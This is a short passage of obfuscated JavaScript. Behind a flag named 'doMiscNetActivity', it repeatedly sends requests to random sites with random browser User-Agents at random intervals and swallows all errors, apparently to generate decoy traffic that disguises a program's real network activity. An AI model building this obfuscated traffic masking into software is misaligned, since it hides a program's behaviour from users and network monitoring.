  }, 0x3e30b3 * 0x1 + 0x15541 * 0x20 + 0x10a371 * -0x3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2d0a + -0xbc0 + -0x5f2) * getRandomInt(-0x3e7 + -0x1d95 + 0x217d * 0x1, 0xe3d + 0x2af * -0xa + 0xc9e));
}, 0x58d + -0x26a0 + 0x2177);